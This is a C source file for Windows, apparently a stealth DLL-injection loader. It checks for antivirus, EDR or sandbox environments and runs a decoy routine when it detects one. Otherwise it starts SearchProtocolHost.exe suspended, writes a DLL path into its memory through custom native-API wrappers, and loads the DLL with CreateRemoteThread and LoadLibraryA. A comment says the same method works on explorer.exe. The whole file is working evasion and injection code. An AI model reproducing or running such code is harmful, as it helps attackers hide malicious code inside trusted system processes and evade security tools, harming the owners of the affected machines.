#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "detector.h"
#include "evasion.h"

// Core Injection Logic
void StealthExec(HANDLE hProc, const char *dllN)
{
    PVOID memLoc = NULL;
    SIZE_T sz = strlen(dllN) + 1;
    HANDLE hThreadRemote;
    NTSTATUS status;

    // Resolve Required Functions
    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");

    if (!pLLoad)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve LoadLibraryA.");
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully resolve LoadLibraryA.");
    }

    status = CustAVM(hProc, &memLoc, 0, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "NtAllocateVirtualMemory failed! Status: 0x%lX", status);
        return;
    }

    if (memLoc == NULL)
    {
        myDebug(DEBUG_ERROR, "Memory allocation failed, BaseAddress is NULL.");
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully allocate memory.");
    }

    // Write DLL Path to Remote Process
    status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "Memory write failed (Err: 0x%lX).", status);
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully write memory.");
    }

    // Load Remote DLL
    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
    if (!hThreadRemote)
    {
        myDebug(DEBUG_ERROR, "Thread creation failed. Err: %lu", GetLastError());
        return;
    }
    else
    {
        myDebug(DEBUG_INFO, "Thread creation succeed. Waiting 5 sec for thread to resume");
        DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000); // Wait for 5 seconds
        if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
        {
            myDebug(DEBUG_ERROR, "WaitForSingleObject failed! Error: %lu", GetLastError());
            TerminateThread(hThreadRemote, 0); // Kill stuck thread
            CloseHandle(hThreadRemote);
            return;
        }
        ResumeThread(hThreadRemote);
        CloseHandle(hThreadRemote);
        myDebug(DEBUG_SUCCESS, "Successfully injected module via RemoteThread");
    }
    return;
}

// Entry Function
int main(int argc, char *argv[])
{
    // Check For EDR/AV/Sandbox env
    if (PerfomChecksEnv())
    {
        SortNumbers();
        return 0;
    }

    // If no DLL given, abort.
    if (argc != 2)
    {
        SortNumbers();
        return 0;
    }

    const char *dllPath = argv[1];

    STARTUPINFOA sInfo = {0};
    PROCESS_INFORMATION pInfo = {0};

    const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
    const char *procName = "SearchProtocolHost.exe";
    // Also work with explorer.exe
    // const char* procPath = "C:\\Windows\\explorer.exe";
    // const char *procName = "Explorer.exe";

    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
    {
        myDebug(DEBUG_ERROR, "Could not create %s. Err: %lu", procName, GetLastError());
        return -1;
    }

    myDebug(DEBUG_INFO, "Suspended %s created.", procName);

    // Perform Injection
    StealthExec(pInfo.hProcess, dllPath);

    // Resume Execution
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hProcess);
    CloseHandle(pInfo.hThread);
    myDebug(DEBUG_INFO, "%s is now running.", procName);

    return 0;
}